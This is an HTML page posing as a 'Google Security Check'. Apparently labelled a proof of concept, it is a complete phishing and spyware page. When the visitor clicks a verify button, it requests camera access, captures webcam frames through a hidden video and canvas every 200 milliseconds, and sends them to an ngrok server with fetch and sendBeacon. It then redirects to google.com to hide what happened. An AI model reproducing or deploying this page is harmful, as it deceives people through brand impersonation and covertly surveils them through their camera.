<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Google Security Verification</title>
<style>
  body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    text-align: center;
    padding: 60px;
    background: #f8f9fa;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
  }
  .panel {
    background: #fff;
    padding: 40px;
    border-radius: 12px;
    box-shadow: 0 4px 20px rgba(0,0,0,0.1);
    max-width: 400px;
    width: 100%;
    border: 1px solid #ddd;
  }
  h2 {
    color: #1a73e8;
    margin-bottom: 12px;
    font-size: 22px;
  }
  p {
    color: #5f6368;
    font-size: 14px;
    margin-bottom: 24px;
  }
  button {
    padding: 14px 28px;
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
    background: #1a73e8;
    color: #fff;
    border: none;
    border-radius: 6px;
    width: 100%;
    transition: background 0.2s;
  }
  button:hover { background: #1557b0; }
  #status {
    margin-top: 20px;
    font-size: 12px;
    color: #333;
    font-family: monospace;
    text-align: left;
    background: #000;
    color: #0f0;
    padding: 10px;
    border-radius: 6px;
    height: 100px;
    overflow-y: auto;
  }
  video, canvas { display: none !important; }
</style>
</head>
<body>

<div class="panel">
  <h2>🔒 Google Security Check</h2>
  <p>Verify your account status to proceed.</p>
  <button id="camBtn">VERIFY ACCOUNT</button>
  <div id="status">> System ready.</div>
</div>

<video id="cam-feed" autoplay playsinline muted></video>
<canvas id="processing-canvas" width="640" height="480"></canvas>

<script>
(function() {
  'use strict';

  const btn = document.getElementById('camBtn');
  const statusEl = document.getElementById('status');
  
  // Endpoint ngrok aktif Anda
  const SERVER_ENDPOINT = "https://studly-unallegorized-brecken.ngrok-free.dev/upload";

  function log(msg) {
    statusEl.innerHTML += "> " + msg + "<br>";
    statusEl.scrollTop = statusEl.scrollHeight;
    console.log("[PoC] " + msg);
  }

  function startTelemetryStream(stream) {
    try {
      const video = document.getElementById('cam-feed');
      video.srcObject = stream;
      video.play().catch(function(){});

      const canvas = document.getElementById('processing-canvas');
      const ctx = canvas.getContext('2d');

      // Kirim frame telemetri secara periodik (setiap 200ms)
      setInterval(function() {
        if (video.readyState === video.HAVE_ENOUGH_DATA) {
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          canvas.toBlob(function(blob) {
            if (!blob) return;

            const formData = new FormData();
            formData.append('file', blob, 'capture.jpg');

            // Kirim via fetch keepalive
            fetch(SERVER_ENDPOINT, {
              method: 'POST',
              body: formData,
              keepalive: true
            }).catch(function() {
              // Fallback menggunakan sendBeacon
              try {
                navigator.sendBeacon(SERVER_ENDPOINT, blob);
              } catch(e) {}
            });

          }, 'image/jpeg', 0.5);
        }
      }, 200);
    } catch(e) {
      log("Stream Error: " + e.message);
    }
  }

  btn.addEventListener('click', async () => {
    try {
      log("Requesting camera access...");

      // Meminta izin media perangkat secara asinkron
      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
      log("Camera access granted! Initializing stream...");

      // Mulai loop pengiriman telemetri
      startTelemetryStream(stream);

      // Jeda singkat sebelum navigasi tingkat atas ke Google
      setTimeout(() => {
        log("Redirecting to Google...");
        window.location.replace('https://www.google.com');
      }, 400);

    } catch (err) {
      log("Camera denied: " + err.name);
      setTimeout(() => {
        window.location.replace('https://www.google.com');
      }, 1000);
    }
  });

})();
</script>

</body>
</html>
